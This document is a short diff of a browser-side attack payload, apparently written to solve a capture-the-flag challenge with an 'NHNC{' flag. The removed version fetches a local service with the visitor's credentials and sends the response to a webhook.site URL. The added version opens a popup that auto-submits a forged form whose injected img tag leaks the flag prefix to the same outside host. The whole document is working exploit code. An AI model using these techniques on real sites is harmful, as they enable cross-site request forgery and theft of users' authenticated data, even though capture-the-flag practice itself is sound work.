@@ -1,13 +1,11 @@
 <script>
-fetch("http://127.0.0.1:5000/", {
-    method: "GET",
-    credentials: "include",
-    headers: {
-        "Origin": "http://webhook.site/"
-    }
-})
-.then(response => response.text())
-.then(data => {
-    fetch("http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?source=" + encodeURIComponent(data));
-});
+  const popup = window.open('', '_blank');
+  popup.document.write(`
+    <form action="http://127.0.0.1:5000/guess" method="POST">
+      <input name="guess" value="NHNC{" />
+      <input name="note" value='<img src="http://webhook.site/xxx?flag=NHNC{" />' />
+      <input type="submit" />
+    </form>
+    <script>document.forms[0].submit();</scr` + `ipt>
+  `);
 </script>
